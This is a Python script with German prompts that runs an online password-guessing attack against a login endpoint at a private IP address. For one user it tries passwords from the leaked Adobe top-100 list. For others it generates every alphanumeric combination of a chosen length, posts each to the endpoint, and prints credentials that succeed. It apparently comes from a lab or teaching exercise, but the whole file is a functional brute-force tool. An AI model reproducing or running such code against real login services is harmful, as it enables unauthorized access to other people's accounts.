
import itertools
import requests

user_input = input('Nutzername: ')
user_array = ['bob', 'ute', 'paul']
combination_array = []

combined = []


def create_ingredients():
    password_ingredients = ''

    for x in range(10):
        password_ingredients += str(x)

    for i in range(ord('a'), ord('z')+1):
        password_ingredients += chr(i)

    for j in range(ord('A'), ord('Z')+1):
        password_ingredients += chr(j)

    return password_ingredients


def create_password(ingredients, length):
    combinations = []
    combinations += itertools.product(ingredients, repeat=length)
    print('Anzahl der Kombinationen: ' + str(len(combinations)))
    return combinations


def combine_profil(user_list, combination_list):
    for i in range(len(user_list)):
        for j in range(len(combination_list)):
            combined.append('Profil ' + user_list[i] +' ' + str(j) + ' : ' + ''.join((combination_list[j])))

    with open('combination_list.txt', 'w') as filehandle:
        for listitem in combined:
            filehandle.write('%s\n' % listitem)


url = 'http://172.50.1.5:8080/validate?'


def execute_hack(user, combinations):
    passwords = []

    if user == 'joe':
        f = open('adobe-top100.txt', 'r')

        for line in f:
            line = line.strip()
            columns = line.split()
            passwords.append(columns[3])

        f.close()

        for i in range(len(passwords)):
            print('Versuchsnummer: ' + str(i))
            data = {
                'benutzername': user,
                'passwort': passwords[i]
            }
            r = requests.post(url, data=data, stream=True)
            if r.text != 'Benutzername oder Passwort falsch!':
                print('Versuchsnummer: ' + str(i))
                print(user + ' ' + passwords[i])
                print(r.text)
                break

    else:
        for i in range(len(combinations)):

            data = {
                'benutzername': user,
                'passwort': ''.join(combinations[i])
            }
            r = requests.post(url, data=data)
            if r.text != 'Benutzername oder Passwort falsch!':
                print('Versuchsnummer: ' + str(i))
                print(user + ' ' + ''.join(combinations[i]))
                print(r.text)


if user_input != 'joe':
    password_length = int(input('Wie lang soll das Passwort sein? '))
    print('Ingredients: ' + create_ingredients())
    combination_array = create_password(create_ingredients(), password_length)
    preparefortext = []
    for i in range(len(combination_array)):
        preparefortext.append(''.join(combination_array[i]))

    with open('combinations.txt', 'w') as filehandle:
        for listitem in preparefortext:
            filehandle.write(listitem + ',')
    # combine_profil(user_array, combination_array)


execute_hack(user_input, combination_array)
